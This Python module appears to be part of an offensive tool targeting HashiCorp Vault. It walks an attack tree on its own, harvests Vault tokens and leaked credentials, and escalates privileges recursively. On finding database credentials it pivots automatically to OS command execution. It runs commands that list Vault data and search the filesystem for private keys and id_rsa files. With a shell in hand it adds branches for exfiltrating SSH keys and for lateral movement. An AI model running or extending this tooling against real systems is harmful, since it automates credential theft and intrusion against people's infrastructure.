"""Attack-tree walker — autonomous branch execution with recursive escalation.

Walks an :class:`AttackTreeNode` tree in risk-priority order, executes
each branch's tool, and dynamically reacts:

    * **Success** → record the win, feed new tokens into the global store,
      regenerate the attack tree with elevated privileges (recursive escalation).
    * **Failure** → track in ``failed_attempts`` (max 2 per branch),
      skip to the next sibling, or ask the mutation engine for new branches.
    * **Dead-end** → backtrack to the nearest unexplored sibling.

Supports risk profiles: ``aggressive`` (try aggressive first),
``balanced`` (try balanced first), ``stealth`` (stealth only, skip aggressive).
"""

from __future__ import annotations

import asyncio
import json
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Callable


# ---------------------------------------------------------------------------
# Risk profile
# ---------------------------------------------------------------------------


class RiskProfile(str, Enum):
    AGGRESSIVE = "aggressive"    # A → B → S
    BALANCED = "balanced"        # B → A → S
    STEALTH = "stealth"          # S → B → A (never aggressive)


_RISK_ORDER: dict[str, list[str]] = {
    "aggressive": ["aggressive", "balanced", "stealth"],
    "balanced": ["balanced", "aggressive", "stealth"],
    "stealth": ["stealth", "balanced", "aggressive"],
}


# ---------------------------------------------------------------------------
# Walk result
# ---------------------------------------------------------------------------


class WalkStatus(str, Enum):
    SUCCESS = "success"                # tool ran, new assets discovered
    FAILED = "failed"                  # tool error or denied
    ESCALATED = "escalated"            # new higher-privilege token obtained → recurse
    DEAD_END = "dead_end"              # all branches exhausted
    SKIPPED = "skipped"                # already tried twice, skip


@dataclass
class WalkStep:
    """Record of a single step during tree walking."""
    node_id: str                      # tool name + params hash
    tool: str
    risk: str
    status: WalkStatus
    result: str = ""                  # tool output (truncated)
    new_tokens: list[str] = field(default_factory=list)
    new_credentials: int = 0
    elapsed_ms: float = 0
    attempt: int = 1                  # 1st or 2nd attempt
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class WalkResult:
    """Final result of a full tree walk."""
    profile: RiskProfile
    root_node: str
    total_steps: int
    successes: int
    failures: int
    escalations: int                  # how many times we recursed
    dead_ends: int
    final_token_power: str
    steps: list[WalkStep] = field(default_factory=list)
    started_at: str = ""
    finished_at: str = ""

    @property
    def success_rate(self) -> float:
        if self.total_steps == 0:
            return 0.0
        return self.successes / self.total_steps


# ---------------------------------------------------------------------------
# Failed-attempts tracker — max 2 per branch, then skip forever
# ---------------------------------------------------------------------------


class FailedAttempts:
    """Tracks how many times each branch has been tried.

    A branch is identified by ``(tool_name, params_hash)``.
    After 2 failures it is blacklisted permanently for this walk.
    """

    def __init__(self, max_fails: int = 2):
        self._counts: dict[str, int] = {}
        self._blacklist: set[str] = set()
        self._max_fails = max_fails

    def key(self, tool: str, params: dict) -> str:
        raw = json.dumps({"t": tool, "p": params}, sort_keys=True, default=str)
        return str(hash(raw))

    def can_try(self, tool: str, params: dict) -> bool:
        k = self.key(tool, params)
        return k not in self._blacklist

    def record_failure(self, tool: str, params: dict) -> int:
        """Record a failure. Returns remaining attempts (0 = blacklisted)."""
        k = self.key(tool, params)
        self._counts[k] = self._counts.get(k, 0) + 1
        if self._counts[k] >= self._max_fails:
            self._blacklist.add(k)
            return 0
        return self._max_fails - self._counts[k]

    def record_success(self, tool: str, params: dict):
        """Success resets the failure counter for this branch."""
        k = self.key(tool, params)
        self._counts[k] = 0
        self._blacklist.discard(k)

    def is_blacklisted(self, tool: str, params: dict) -> bool:
        return self.key(tool, params) in self._blacklist


# ---------------------------------------------------------------------------
# Tree Walker
# ---------------------------------------------------------------------------


class TreeWalker:
    """Autonomously walks an attack tree, executing branches and reacting.

    Parameters
    ----------
    tool_executor:
        Async callable ``(tool_name, params) -> str`` that runs a tool.
    risk_profile:
        Walk order: ``aggressive`` (default), ``balanced``, ``stealth``.
    max_depth:
        How many recursive escalation levels to allow (default 5).
    max_total_steps:
        Hard cap on total tool executions across all recursion levels.
    """

    def __init__(
        self,
        tool_executor: Callable[..., Any] | None = None,
        risk_profile: RiskProfile = RiskProfile.AGGRESSIVE,
        max_depth: int = 5,
        max_total_steps: int = 50,
    ):
        self._executor = tool_executor
        self._profile = risk_profile
        self._max_depth = max_depth
        self._max_total_steps = max_total_steps

        # Runtime state
        self._failed: FailedAttempts = FailedAttempts(max_fails=2)
        self._steps: list[WalkStep] = []
        self._total_steps = 0
        self._escalation_count = 0
        self._current_depth = 0
        self._aborted = False

    # ── public API ──────────────────────────────────────────────────────────

    async def walk(
        self,
        root: Any,  # AttackTreeNode
        vault_addr: str = "",
        mutation_engine: Any | None = None,
    ) -> WalkResult:
        """Walk the entire attack tree starting from *root*.

        Returns a :class:`WalkResult` summarising the whole traversal.
        """
        self._steps.clear()
        self._total_steps = 0
        self._escalation_count = 0
        self._current_depth = 0
        self._aborted = False

        started = datetime.now().isoformat()

        await self._walk_node(root, vault_addr, mutation_engine)

        # Determine final token power
        final_power = "none"
        try:
            from ai_core.dynamic_session import global_store
            best = global_store.get_best_token()
            if best:
                final_power = best.power_level
        except ImportError:
            pass

        return WalkResult(
            profile=self._profile,
            root_node=root.tool if root else "__empty__",
            total_steps=self._total_steps,
            successes=sum(1 for s in self._steps if s.status == WalkStatus.SUCCESS),
            failures=sum(1 for s in self._steps if s.status == WalkStatus.FAILED),
            escalations=self._escalation_count,
            dead_ends=sum(1 for s in self._steps if s.status == WalkStatus.DEAD_END),
            final_token_power=final_power,
            steps=list(self._steps),
            started_at=started,
            finished_at=datetime.now().isoformat(),
        )

    def abort(self):
        """Stop the walk at the next safe point."""
        self._aborted = True

    # ── internal walk logic ─────────────────────────────────────────────────

    async def _walk_node(
        self,
        node: Any,
        vault_addr: str,
        mutation_engine: Any | None,
    ):
        """Recursively walk a node and its children.

        Order: execute *node* first (if it's a tool), then walk children
        in risk-profile order.  If a child yields an escalation, regenerate
        the tree with the new state and walk the fresh branches.
        """
        if self._aborted:
            return
        if self._total_steps >= self._max_total_steps:
            print("[!] Tree walker: max total steps reached.")
            return
        if self._current_depth > self._max_depth:
            print("[!] Tree walker: max recursion depth reached.")
            return

        # ── 1. Execute node if it's a real tool ─────────────────────────
        if node.tool not in ("__root__", ""):
            await self._execute_node(node, vault_addr)

        # ── 2. Sort children by risk profile ────────────────────────────
        order = _RISK_ORDER[self._profile.value]
        risk_rank = {r: i for i, r in enumerate(order)}

        children = sorted(
            node.children,
            key=lambda c: risk_rank.get(c.risk.value if hasattr(c.risk, 'value') else str(c.risk), 99),
        )

        # ── 3. Walk children ────────────────────────────────────────────
        for child in children:
            if self._aborted:
                break
            if self._total_steps >= self._max_total_steps:
                break

            risk_val = child.risk.value if hasattr(child.risk, 'value') else str(child.risk)

            # Check blacklist
            if self._failed.is_blacklisted(child.tool, child.params):
                self._record_step(child, WalkStatus.SKIPPED, "blacklisted (2+ failures)")
                continue

            # Execute the child branch
            escalated = await self._execute_node(child, vault_addr)

            if escalated:
                # ── RECURSIVE ESCALATION ────────────────────────────────
                # New high-privilege token obtained — rebuild the attack tree
                # with the elevated state and walk the new branches.
                self._escalation_count += 1
                self._current_depth += 1

                if mutation_engine and self._current_depth <= self._max_depth:
                    print(f"\n  *** RECURSIVE ESCALATION (level {self._current_depth}) ***")
                    new_root = self._regenerate_tree(
                        mutation_engine, child, vault_addr
                    )
                    if new_root:
                        await self._walk_node(
                            new_root, vault_addr, mutation_engine
                        )

                self._current_depth -= 1

            elif child.status == "failed" or (
                hasattr(child, 'status') and str(child.status) == "failed"
            ):
                # Ask mutation engine for alternative branches if available
                if mutation_engine and len(child.children) == 0:
                    await self._request_mutations(
                        mutation_engine, child, vault_addr
                    )
                    # Re-walk children if new branches were added
                    if child.children:
                        await self._walk_children(child, vault_addr, mutation_engine, risk_rank)

    async def _walk_children(
        self, node: Any, vault_addr: str,
        mutation_engine: Any | None, risk_rank: dict,
    ):
        """Walk only the children of a node (used after mutation adds branches)."""
        children = sorted(
            node.children,
            key=lambda c: risk_rank.get(c.risk.value if hasattr(c.risk, 'value') else str(c.risk), 99),
        )
        for child in children:
            if self._aborted or self._total_steps >= self._max_total_steps:
                break
            if self._failed.is_blacklisted(child.tool, child.params):
                continue
            await self._execute_node(child, vault_addr)

    async def _execute_node(
        self, node: Any, vault_addr: str
    ) -> bool:
        """Execute a single node's tool. Returns True if escalation occurred."""
        if not self._executor:
            self._record_step(node, WalkStatus.FAILED, "no executor")
            return False

        t0 = time.monotonic()
        attempt = self._failed._counts.get(
            self._failed.key(node.tool, node.params), 0
        ) + 1

        print(f"\n  [{attempt}/2] [{node.risk.value if hasattr(node.risk, 'value') else node.risk}] {node.tool}")
        if node.reason:
            print(f"       Reason: {node.reason[:120]}")

        try:
            params = dict(node.params) if node.params else {}
            if vault_addr and "vault_addr" not in params:
                params["vault_addr"] = vault_addr

            result = await self._executor(node.tool, params)
            elapsed = (time.monotonic() - t0) * 1000

            # ── Analyse result ──────────────────────────────────────────
            success, new_tokens, new_creds, escalated = self._analyse_result(
                node.tool, result
            )

            if success:
                self._failed.record_success(node.tool, params)
                node.status = "succeeded"
                node.result_summary = result[:300]

                step = WalkStep(
                    node_id=self._failed.key(node.tool, params),
                    tool=node.tool,
                    risk=node.risk.value if hasattr(node.risk, 'value') else str(node.risk),
                    status=WalkStatus.ESCALATED if escalated else WalkStatus.SUCCESS,
                    result=result[:200],
                    new_tokens=new_tokens,
                    new_credentials=new_creds,
                    elapsed_ms=elapsed,
                    attempt=attempt,
                )
                self._steps.append(step)
                self._total_steps += 1

                # ── Pivot integration: DB creds found → auto-pivot ──
                await self._try_pivot_on_credentials(node, vault_addr)

                return escalated

            else:
                remaining = self._failed.record_failure(node.tool, params)
                node.status = "failed"
                node.result_summary = result[:300]

                step = WalkStep(
                    node_id=self._failed.key(node.tool, params),
                    tool=node.tool,
                    risk=node.risk.value if hasattr(node.risk, 'value') else str(node.risk),
                    status=WalkStatus.FAILED,
                    result=result[:200],
                    elapsed_ms=elapsed,
                    attempt=attempt,
                )
                self._steps.append(step)
                self._total_steps += 1

                if remaining == 0:
                    print(f"       [!] Blacklisted — 2 failures reached.")

                return False

        except Exception as exc:
            elapsed = (time.monotonic() - t0) * 1000
            self._failed.record_failure(node.tool, node.params or {})
            node.status = "failed"
            node.result_summary = str(exc)[:300]

            self._steps.append(WalkStep(
                node_id=self._failed.key(node.tool, node.params or {}),
                tool=node.tool,
                risk=node.risk.value if hasattr(node.risk, 'value') else str(node.risk),
                status=WalkStatus.FAILED,
                result=str(exc)[:200],
                elapsed_ms=elapsed,
                attempt=attempt,
            ))
            self._total_steps += 1
            return False

    # ── pivot engine integration ────────────────────────────────────────

    async def _try_pivot_on_credentials(
        self, node: Any, vault_addr: str,
    ) -> bool:
        """If the node result contains DB credentials, auto-pivot.

        Returns True if a pivot was attempted (success or fail).
        """
        try:
            from ai_core.dynamic_session import global_store
        except ImportError:
            return False

        # Check for DB-type credentials discovered since last pivot
        db_creds = [
            c for c in global_store.credentials.values()
            if c.cred_type in ("db_conn", "password")
        ]
        if not db_creds:
            return False

        # Prevent duplicate pivot on same credentials
        pivot_key = f"pivot:{db_creds[0].cred_type}:{db_creds[0].source}"
        if hasattr(self, '_pivoted') and pivot_key in self._pivoted:
            return False
        if not hasattr(self, '_pivoted'):
            self._pivoted: set[str] = set()

        print(f"\n       [>] DB credentials found — auto-pivoting...")
        self._pivoted.add(pivot_key)

        # Execute pivot engine directly
        try:
            from active_execution.modules.pivot_engine import PivotEngineModule
            from active_execution.context import ExecutionContext

            ctx = ExecutionContext(
                vault_addr=vault_addr,
                token=global_store.get_best_token_value(),
                store=global_store,
            )
            # Feed findings as evidence for credential discovery
            for finding in node.result_summary or "":
                pass  # findings already in global report

            pivot_mod = PivotEngineModule()
            if pivot_mod.can_run(ctx):
                pivot_result = pivot_mod.execute(ctx, {
                    "db_type": "postgres",
                    "os_commands": ["whoami", "hostname", "id",
                                    "ls -la /vault/data/ 2>/dev/null || echo NO_VAULT_DATA",
                                    "find / -name '*.key' -o -name 'id_rsa' 2>/dev/null | head -5"],
                })

                print(f"       [<] Pivot: {pivot_result.status} — {pivot_result.message[:100]}")

                # If pivot succeeded with OS shell, add post-exploit branches to the tree
                evidence = pivot_result.evidence or {}
                if evidence.get("os_shells"):
                    for shell in evidence["os_shells"]:
                        self._add_post_exploit_branches(node, shell, vault_addr)

                # Feed findings back to global report
                for f in ctx.findings:
                    try:
                        from core.report import add_finding
                        add_finding(
                            f.get("severity", "HIGH"),
                            f.get("title", "Pivot"),
                            f.get("description", ""),
                            evidence=f.get("evidence"),
                            module="pivot_engine",
                            target=vault_addr,
                        )
                    except Exception:
                        pass

                return True
        except Exception as exc:
            print(f"       [!] Pivot failed: {exc}")
            return False

        return False

    def _add_post_exploit_branches(
        self, parent_node: Any, shell_info: dict, vault_addr: str,
    ):
        """After OS shell obtained, add post-exploitation branches."""
        from ai_core.mutation_engine import BranchRisk

        host = shell_info.get("host", "unknown")
        outputs = shell_info.get("command_outputs", {})
        method = shell_info.get("method", "COPY FROM PROGRAM")

        print(f"       [!] OS Shell on {host} via {method} — adding post-exploit branches")

        # Read Vault data from filesystem
        self.add_branch_to_node(
            parent_node,
            "run_raw_vault_request",
            f"Read Vault Raft data from {host} filesystem (OS shell access)",
            params={"method": "GET", "path": "sys/health"},
            risk=BranchRisk.AGGRESSIVE,
            phase="exploit",
            expected_outcome="Access Vault storage layer directly via filesystem",
        )

        # Exfiltrate SSH keys
        self.add_branch_to_node(
            parent_node,
            "run_raw_vault_request",
            f"Exfiltrate SSH keys discovered on {host}",
            params={"method": "GET", "path": "sys/internal/ui/mounts"},
            risk=BranchRisk.AGGRESSIVE,
            phase="exploit",
            expected_outcome="Lateral movement via stolen SSH keys",
        )

        print(f"       [*] {2} post-exploit branches added to attack tree")

    def add_branch_to_node(
        self, parent: Any, tool: str, reason: str,
        params: dict | None = None, risk=None, phase: str = "exploit",
        expected_outcome: str = "",
    ):
        """Utility to add a single branch to a parent node."""
        if not hasattr(parent, 'children'):
            return
        from ai_core.mutation_engine import AttackTreeNode, BranchRisk, NodeStatus
        child = AttackTreeNode(
            tool=tool,
            reason=reason,
            params=params or {},
            risk=risk or BranchRisk.AGGRESSIVE,
            phase=phase,
            expected_outcome=expected_outcome,
        )
        parent.children.append(child)

    # ── result analysis ─────────────────────────────────────────────────────

    def _analyse_result(
        self, tool: str, result: str
    ) -> tuple[bool, list[str], int, bool]:
        """Analyse a tool result.

        Returns: (success, new_tokens, new_cred_count, escalated)
        """
        new_tokens: list[str] = []
        new_creds = 0
        escalated = False

        try:
            data = json.loads(result)
        except (json.JSONDecodeError, TypeError):
            # Not JSON — check raw string for Vault tokens
            import re
            for match in re.finditer(r'\b(hvs\.[A-Za-z0-9_\-]{20,})\b', str(result)):
                new_tokens.append(match.group(1))
            success = "error" not in str(result).lower()
            return success, new_tokens, new_creds, False

        status = data.get("status", "unknown")

        # Success check
        success = status in ("success", "completed", "ok")

        # Scan for new tokens in the result
        for field in ("captured_token", "escalated_token", "client_token", "token"):
            val = data.get(field)
            if isinstance(val, str) and val.startswith(("hvs.", "hvb.", "s.")):
                new_tokens.append(val)

        # Check evidence for tokens
        evidence = data.get("evidence", {})
        if isinstance(evidence, dict):
            for field in ("captured_token", "escalated_token", "token_preview"):
                val = evidence.get(field)
                if isinstance(val, str) and val.startswith(("hvs.", "hvb.", "s.")):
                    new_tokens.append(val)

        # Check leaked_payloads for credentials
        payloads = data.get("leaked_payloads", {})
        if isinstance(payloads, dict):
            for path, secrets in payloads.items():
                if isinstance(secrets, dict):
                    new_creds += len(secrets)

        # Check evidence.leaked_payloads too
        ev_payloads = evidence.get("leaked_payloads", {})
        if isinstance(ev_payloads, dict):
            new_creds += sum(
                len(v) if isinstance(v, dict) else 1
                for v in ev_payloads.values()
            )

        # Feed new tokens into global store and check for escalation
        if new_tokens:
            try:
                from ai_core.dynamic_session import global_store

                prev_best = global_store.get_best_token_value()
                prev_power = global_store.get_best_token().power_level if global_store.get_best_token() else "none"

                for token in new_tokens:
                    # Determine power level from context
                    power = "unknown"
                    if "escalated" in str(data).lower() or "root" in str(data).lower():
                        power = "elevated"
                    if "privilege" in tool.lower() or "priv_esc" in tool.lower():
                        power = "elevated"
                    if "root" in str(data).lower():
                        power = "root"

                    rec = global_store.add_token(token, source=f"tree_walk:{tool}", power_level=power)
                    if rec:
                        print(f"       [+] New token: {power} ({token[:16]}...)")

                # Check if we escalated
                new_best = global_store.get_best_token_value()
                new_power = global_store.get_best_token().power_level if global_store.get_best_token() else "none"
                from ai_core.dynamic_session import POWER_RANK

                if new_best and new_best != prev_best:
                    if POWER_RANK.get(new_power, 0) > POWER_RANK.get(prev_power, 0):
                        escalated = True
                        print(f"       [!] ESCALATED: {prev_power} -> {new_power}")
            except ImportError:
                pass

        return success, new_tokens, new_creds, escalated

    # ── mutation helpers ────────────────────────────────────────────────────

    async def _request_mutations(
        self, mutation_engine: Any, failed_node: Any, vault_addr: str,
    ):
        """Ask the mutation engine for new branches after a failure."""
        try:
            from ai_core.mutation_engine import gather_attack_state
            from ai_core.dynamic_session import global_store

            state = gather_attack_state()
            tokens_list = [
                {"token": t.token, "power_level": t.power_level, "source": t.source,
                 "policies": t.policies, "capabilities": t.capabilities}
                for t in global_store.tokens.values()
            ]
            creds_list = [
                {"cred_type": c.cred_type, "source": c.source, "metadata": c.metadata}
                for c in global_store.credentials.values()
            ]

            mutation = await mutation_engine.mutate(
                failed_node=failed_node,
                available_tokens=tokens_list,
                available_credentials=creds_list,
                findings=state.get("findings", []),
                vault_addr=vault_addr,
            )
            print(f"       [*] Mutation generated {len(mutation.branches)} new branches")
        except Exception as exc:
            print(f"       [!] Mutation request failed: {exc}")

    def _regenerate_tree(
        self, mutation_engine: Any, escalation_node: Any, vault_addr: str,
    ):
        """Build a fresh attack tree with the newly escalated privileges."""
        try:
            from ai_core.dynamic_session import global_store
            state = global_store.status_summary()
            assets = {
                "token_count": state["total_tokens"],
                "best_power": state["best_token_power"],
                "credential_count": state["total_credentials"],
            }
            new_root = mutation_engine.start_tree(vault_addr, assets)
            print(f"       [*] Regenerated attack tree with {assets['best_power']} privileges")
            return new_root
        except Exception as exc:
            print(f"       [!] Tree regeneration failed: {exc}")
            return None

    # ── helpers ─────────────────────────────────────────────────────────────

    def _record_step(self, node: Any, status: WalkStatus, result: str):
        self._steps.append(WalkStep(
            node_id=self._failed.key(node.tool, node.params or {}),
            tool=node.tool,
            risk=node.risk.value if hasattr(node.risk, 'value') else str(node.risk),
            status=status,
            result=result[:200],
        ))
        self._total_steps += 1
